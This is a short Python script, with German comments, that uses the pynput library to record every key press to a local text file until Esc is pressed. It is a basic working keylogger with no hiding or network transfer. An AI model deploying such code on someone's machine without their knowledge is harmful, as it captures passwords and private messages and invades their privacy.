from pynput.keyboard import Key, Listener

# Dateipfad für die Ausgabedatei
output_file_path = '../tastenanschlaege.txt'

def on_press(key):
    with open(output_file_path, 'a') as f:
        f.write('{0} pressed\n'.format(key))

def on_release(key):
    with open(output_file_path, 'a') as f:
        #f.write('{0} release\n'.format(key))
        if key == Key.esc:
            # Stop listener
            return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()